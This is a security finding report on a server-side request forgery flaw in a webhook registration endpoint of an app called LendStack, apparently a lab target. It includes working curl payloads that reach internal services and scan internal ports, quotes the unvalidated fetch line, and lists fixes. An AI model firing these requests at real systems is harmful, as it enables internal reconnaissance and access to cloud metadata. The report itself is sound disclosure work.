# V-14 — Server-Side Request Forgery (SSRF)

| Field | Value |
|---|---|
| **Severity** | High (CVSS 7.7) |
| **CWE** | CWE-918 — Server-Side Request Forgery |
| **Endpoint** | `POST /api/v1/webhooks` |
| **Component** | `target-app/src/webhooks/routes.js` |
| **Status** | Confirmed exploitable |

## Summary
The webhook registration endpoint fetches the user-supplied URL to verify it is reachable. It lacks validation on the scheme, host, or resolved IP. An attacker can force the LendStack server to make requests to internal services, cloud metadata endpoints, and arbitrary network ports.

## Evidence
1. Access internal mock-llm:
   curl -s -X POST localhost:3000/api/v1/webhooks -H "Authorization: Bearer $TOKEN_A" -H 'content-type: application/json' -d '{"url":"http://mock-llm:4000/ssrf-target"}' | jq '.verify'
   Response is 200 with the internal response body. Server logs show the request came from the LendStack container (172.18.0.x), not the host.

2. Access internal fluent-bit metrics:
   curl -s -X POST localhost:3000/api/v1/webhooks -H "Authorization: Bearer $TOKEN_A" -H 'content-type: application/json' -d '{"url":"http://fluent-bit:2020/api/v1/metrics"}' | jq '.verify'
   Response is 200 with the Fluent Bit metrics JSON.

3. Blind port scanning:
   curl -s -X POST localhost:3000/api/v1/webhooks -H "Authorization: Bearer $TOKEN_A" -H 'content-type: application/json' -d '{"url":"http://postgres:5432"}' | jq '.verify'
   Response is {"error": "fetch failed"} (open port, non-HTTP). A closed port yields a similar error, allowing internal mapping.

## Root Cause
The webhooks/routes.js file performs a blind fetch on the user-supplied string:
const r = await fetch(url, { signal: controller.signal });
There is no URL validation or network egress filtering before the request.

## Fix
Implement strict egress filtering:
- Allowlist external domains, or block private IPs (RFC 1918, loopback, link-local 169.254.169.254).
- Enforce HTTP/HTTPS schemes only.
- Ideally, route webhooks through a dedicated, firewalled egress proxy.
